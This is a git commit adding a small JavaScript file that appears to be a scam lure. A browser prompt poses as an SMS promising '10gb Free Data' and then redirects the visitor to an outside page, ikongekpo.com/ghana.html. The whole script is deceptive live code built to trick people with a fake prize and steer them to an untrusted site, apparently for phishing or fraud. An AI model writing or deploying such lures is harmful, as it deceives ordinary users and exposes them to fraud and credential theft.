41d92d3cfb5227b352bc82bc8f5d2688ef923d52
mfednewblog9 <newekpeitid@gmail.com>
2026-03-02 23:24:27 +0100

    Create ghana-day.js

---
+++ ghana-day.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE'
+password=prompt('SMS: Congratulations Your 10gb Free Data is PENDING... Click Ok to Activate Now','ACTIVATE');
+if (password != 'ACTIVATE') {
+location.href='https://ikongekpo.com/ghana.html';
+}
